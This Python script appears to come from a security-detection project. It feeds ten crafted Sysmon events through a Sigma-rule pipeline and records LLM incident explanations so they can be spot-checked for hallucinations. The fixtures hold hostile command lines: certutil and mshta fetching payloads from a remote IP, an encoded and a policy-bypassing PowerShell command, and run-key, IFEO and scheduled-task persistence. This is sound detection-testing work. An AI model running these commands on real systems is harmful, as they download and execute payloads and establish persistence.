"""Day 10 (Pair 2) manual verification tool: hallucination spot-check.

Roadmap task (docs/02_NightOwl_Handbook_Vol2_Roadmap.md, Phase 2 / Day 10):
"Manually verify 10 generated explanations against ground truth using Pair
1's now-real incidents; note failures."

There's no seed/fixture data producing real incidents yet, so this script
follows Pair 1's own precedent for the same situation (manual testing guide
§13.4/§14.4): craft Sysmon-shaped records that match the real Sigma rules
and POST them through the actual running app (`app.main:app`, real
Postgres via DATABASE_URL, real detection/incident/severity pipeline) --
only `read_records_as_dicts` is mocked, so nothing about matching, grouping,
or severity scoring is faked.

Run for real from backend/ (requires `docker compose up -d db` and a real
LLM key -- see .env's LLM_PROVIDER/LLM_API_KEY/GROQ_API_KEY):
    ./venv/Scripts/python.exe scripts/hallucination_spot_check.py

Writes full request/response data to
scripts/hallucination_spot_check_output.json for reference while writing
docs/research/hallucination-eval.md.
"""

import json
import sys
from datetime import datetime, timezone
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "backend"))  # <repo>/backend

from fastapi.testclient import TestClient  # noqa: E402

from app.db.session import SessionLocal  # noqa: E402
from app.main import app  # noqa: E402
from app.models.incident import Incident  # noqa: E402

REAL_CAPTURE_PATH = (
    Path(__file__).resolve().parents[2] / "backend" / "sample_logs" / "sysmon_vm_capture.evtx"
)

_TIMESTAMP = "2026-08-19T12:00:00.000000+00:00"


def _record(event_id: str, computer: str, data: dict[str, str]) -> dict:
    return {
        "Event": {
            "System": {
                "EventID": event_id,
                "TimeCreated": {"@SystemTime": _TIMESTAMP},
                "Computer": computer,
            },
            "EventData": {"Data": [{"@Name": k, "#text": v} for k, v in data.items()]},
        }
    }


# One crafted record per real Sigma rule in app/detection/rules/*.yml, each
# on its own host so every match becomes its own incident (grouping is
# same-host + 1hr window). `rule_title`/`technique_id`/`level` are this
# script's own ground truth about what *should* be detected -- independent
# of whatever the engine/severity_service actually computes, so a mismatch
# there is itself worth noting in the write-up.
SPOT_CHECK_CASES = [
    {
        "host": "SPOTCHECK-01",
        "rule_title": "Suspicious Encoded PowerShell Command",
        "technique_id": "T1059.001",
        "record": _record(
            "1",
            "SPOTCHECK-01",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": "powershell.exe -enc JABzAD0AJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADUAJwA=",
                "User": "SPOTCHECK-01\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-02",
        "rule_title": "PowerShell Execution Policy Bypass",
        "technique_id": "T1059.001",
        "record": _record(
            "1",
            "SPOTCHECK-02",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": r"powershell.exe -nop -ExecutionPolicy Bypass -File C:\Users\Public\update.ps1",
                "User": "SPOTCHECK-02\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-03",
        "rule_title": "Certutil Download via urlcache/split Flags",
        "technique_id": "T1105",
        "record": _record(
            "1",
            "SPOTCHECK-03",
            {
                "Image": r"C:\Windows\System32\certutil.exe",
                "CommandLine": r"certutil.exe -urlcache -split -f http://185.220.101.5/payload.exe C:\Users\Public\payload.exe",
                "User": "SPOTCHECK-03\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-04",
        "rule_title": "Suspicious Network Connection from LOLBin",
        "technique_id": "T1071.001",
        "record": _record(
            "3",
            "SPOTCHECK-04",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "User": "SPOTCHECK-04\\jdoe",
                "Protocol": "tcp",
                "SourceIp": "10.0.0.15",
                "SourcePort": "52344",
                "DestinationIp": "185.220.101.5",
                "DestinationPort": "443",
            },
        ),
    },
    {
        "host": "SPOTCHECK-05",
        "rule_title": "Suspicious Executable Written to Public or Temp Directory",
        "technique_id": "T1105",
        "record": _record(
            "11",
            "SPOTCHECK-05",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "User": "SPOTCHECK-05\\jdoe",
                "TargetFilename": r"C:\Users\Public\update.exe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-06",
        "rule_title": "Registry Run Key Persistence",
        "technique_id": "T1547.001",
        "record": _record(
            "13",
            "SPOTCHECK-06",
            {
                "TargetObject": r"HKU\S-1-5-21-1111111111-2222222222-3333333333-1001\Software\Microsoft\Windows\CurrentVersion\Run\Updater",
                "Details": r"C:\Users\Public\update.exe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-07",
        "rule_title": "Registry IFEO Debugger Hijack",
        "technique_id": "T1546.012",
        "record": _record(
            "13",
            "SPOTCHECK-07",
            {
                "TargetObject": r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe\Debugger",
                "Details": r"C:\Windows\System32\cmd.exe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-08",
        "rule_title": "Scheduled Task Creation via schtasks.exe",
        "technique_id": "T1053.005",
        "record": _record(
            "1",
            "SPOTCHECK-08",
            {
                "Image": r"C:\Windows\System32\schtasks.exe",
                "CommandLine": r"schtasks.exe /create /tn Updater /tr C:\Users\Public\update.exe /sc onlogon /ru SYSTEM",
                "User": "SPOTCHECK-08\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-09",
        "rule_title": "Suspicious Scheduled Task via PowerShell Cmdlet",
        "technique_id": "T1053.005",
        "record": _record(
            "1",
            "SPOTCHECK-09",
            {
                "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                "CommandLine": r"powershell.exe -Command \"$A = New-ScheduledTaskAction -Execute 'C:\Users\Public\update.exe'; Register-ScheduledTask -TaskName Updater -Action $A\"",
                "User": "SPOTCHECK-09\\jdoe",
            },
        ),
    },
    {
        "host": "SPOTCHECK-10",
        "rule_title": "Suspicious Mshta Execution",
        "technique_id": "T1218.005",
        "record": _record(
            "1",
            "SPOTCHECK-10",
            {
                "Image": r"C:\Windows\System32\mshta.exe",
                "CommandLine": "mshta.exe http://185.220.101.5/payload.hta",
                "User": "SPOTCHECK-10\\jdoe",
            },
        ),
    },
]


def main() -> None:
    client = TestClient(app)
    output: dict = {}

    # Call A: real capture, unmocked reader -- confirms 0 false positives on
    # real benign data (already known clean per manual testing guide §13.5).
    print(f"Call A: ingesting real capture {REAL_CAPTURE_PATH.name} ...")
    with REAL_CAPTURE_PATH.open("rb") as f:
        response_a = client.post(
            "/ingest",
            files={"file": (REAL_CAPTURE_PATH.name, f, "application/octet-stream")},
        )
    print(f"  HTTP {response_a.status_code}: {response_a.json()}")
    output["call_a_real_capture"] = {"status_code": response_a.status_code, "body": response_a.json()}

    # Call B: 10 crafted records, one per real rule, through the real
    # ingest -> detect -> group -> severity pipeline.
    print("\nCall B: ingesting 10 crafted records (one per rule) ...")
    records = [case["record"] for case in SPOT_CHECK_CASES]
    with patch("app.api.routes_ingest.read_records_as_dicts", lambda path: iter(records)):
        response_b = client.post(
            "/ingest",
            files={"file": ("spot_check.evtx", b"irrelevant, reader is mocked", "application/octet-stream")},
        )
    print(f"  HTTP {response_b.status_code}: {response_b.json()}")
    output["call_b_crafted_records"] = {"status_code": response_b.status_code, "body": response_b.json()}

    incident_ids = response_b.json().get("incident_ids", [])
    if len(incident_ids) != len(SPOT_CHECK_CASES):
        print(
            f"\nWARNING: expected {len(SPOT_CHECK_CASES)} incidents, got {len(incident_ids)}. "
            "Check SPOT_CHECK_CASES against the current rule set."
        )

    # Map each incident id back to its crafted host (don't rely on
    # incident_ids list order -- query the DB directly).
    host_to_incident: dict[str, dict] = {}
    with SessionLocal() as db:
        for incident_id in incident_ids:
            incident = db.get(Incident, incident_id)
            if incident is not None:
                host_to_incident[incident.host] = {
                    "incident_id": incident.id,
                    "title": incident.title,
                    "severity": incident.severity,
                    "mitre_technique_ids": incident.mitre_technique_ids,
                }

    print("\nIncidents created:")
    for host, info in host_to_incident.items():
        print(f"  {host}: {info}")

    # Call C: explain() each spot-check incident, per-incident try/except so
    # one failure (quota/rate-limit/etc.) doesn't abort the run.
    print(f"\nCall C: explaining {len(host_to_incident)} incidents ...")
    spot_checks = []
    for case in SPOT_CHECK_CASES:
        host = case["host"]
        incident_info = host_to_incident.get(host)
        entry = {
            "host": host,
            "ground_truth": {
                "expected_rule_title": case["rule_title"],
                "expected_technique_id": case["technique_id"],
            },
            "incident": incident_info,
        }
        if incident_info is None:
            entry["explain_error"] = f"no incident found for host {host} -- rule likely didn't match"
            spot_checks.append(entry)
            print(f"  {host}: SKIPPED (no incident)")
            continue

        incident_id = incident_info["incident_id"]
        try:
            resp = client.post(f"/incidents/{incident_id}/explain")
            if resp.status_code != 200:
                entry["explain_error"] = f"HTTP {resp.status_code}: {resp.text}"
                print(f"  {host} (incident {incident_id}): FAILED HTTP {resp.status_code}")
            else:
                entry["explain_response"] = resp.json()
                print(f"  {host} (incident {incident_id}): OK")
        except Exception as exc:  # noqa: BLE001 -- record any failure, keep going
            entry["explain_error"] = f"{type(exc).__name__}: {exc}"
            print(f"  {host} (incident {incident_id}): EXCEPTION {exc}")

        spot_checks.append(entry)

    output["spot_checks"] = spot_checks

    out_path = Path(__file__).resolve().parent / "hallucination_spot_check_output.json"
    out_path.write_text(json.dumps(output, indent=2, ensure_ascii=False), encoding="utf-8")
    print(f"\nWrote full output to {out_path}")


if __name__ == "__main__":
    main()
